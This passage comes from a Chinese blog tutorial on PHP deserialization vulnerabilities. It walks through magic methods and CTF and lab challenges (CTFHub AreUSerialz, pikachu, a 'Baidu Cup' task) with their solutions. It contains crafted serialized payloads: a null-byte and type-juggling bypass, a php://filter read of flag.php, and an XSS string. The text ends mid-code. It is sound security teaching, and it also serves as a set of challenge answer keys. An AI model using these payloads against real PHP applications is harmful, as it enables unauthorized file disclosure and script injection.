class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png" alt="image-20210910213239299"></p>
<h2 id="1-4-无类简单题目"><a href="#1-4-无类简单题目" class="headerlink" title="1.4 无类简单题目"></a>1.4 无类简单题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Love&quot;</span>;</span><br><span class="line">    <span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$str1</span>) === <span class="variable">$str</span>)&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//WP:?str1=s:4:&quot;Love&quot;;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br><span class="line"><span class="class">//<span class="title">WP</span>:<span class="title">cookie</span>:<span class="title">ISecer</span>=<span class="title">s</span>:0:&quot;&quot;;</span></span><br><span class="line"><span class="class">    //顺序问题</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-有类简单题目"><a href="#1-5-有类简单题目" class="headerlink" title="1.5 有类简单题目"></a>1.5 有类简单题目</h2><p>触发魔术方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct <span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct <span class="comment">//对象被销毁时 触发 使用unserialize时触发</span></span><br><span class="line">__toString <span class="comment">//echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发</span></span><br><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() 	<span class="comment">//使用serialize时触发 </span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>魔术方法参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<h2 id="1-5-CTF-题目"><a href="#1-5-CTF-题目" class="headerlink" title="1.5 CTF 题目"></a>1.5 CTF 题目</h2><h3 id="1-5-1-CTFHUB-AreUSerialz"><a href="#1-5-1-CTFHUB-AreUSerialz" class="headerlink" title="1.5.1 CTFHUB AreUSerialz"></a>1.5.1 CTFHUB AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">1.?str传参，绕过is_valid() 之后，进行反序列化unserialize(<span class="variable">$str</span>)，</span><br><span class="line">  传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()</span><br><span class="line">2. __construct() 对变量初始化操作</span><br><span class="line">3. __destruct() op值对比：2的话强制转换成1；</span><br><span class="line">4.调用process()函数</span><br><span class="line">5.op == <span class="string">&quot;1&quot;</span>为写内容；op == <span class="string">&quot;2&quot;</span>为读取内容</span><br><span class="line">6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测</span><br><span class="line">  可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===</span><br><span class="line">7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>; <span class="comment">//空格 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<p>​        <em><em>protected权限的变量在序列化的时会有%00</em>%00字符</em>*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。</p>
<p><strong>解决办法1：</strong> <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    public <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = new FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>解决办法2：</strong> <strong>%00更改为 \00，s 更改为 S</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将所得到的内容中 %00更改为 \00，s 更改为 S</span></span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>pikachu</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$unser</span> = <span class="keyword">new</span> S();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-5-2-“百度杯”CTF比赛-十月场"><a href="#1-5-2-“百度杯”CTF比赛-十月场" class="headerlink" title="1.5.2 “百度杯”CTF比赛 十月场"></a>1.5.2 “百度杯”CTF比赛 十月场</h3><p><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1&r=54967">题目链接</a></p>
<p>index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p>
<p>查看源代码</p>
<p><img src="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png" alt="image-20210910214204513"></p>
<p>进行 md5 解密，得到  <em>kkkkkk01123</em> </p>
<p>则 <code>$key=</code></p>
<p>根据题目，不能使 ?key=123</p>
<p>则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p>
<p>得到 next step is Gu3ss_m3_h2h2.php</p>
<p>然后我们访问 Gu3ss_m3_h2h2.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            //the secret is <span class="keyword">in</span> the f15g_1s_here.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        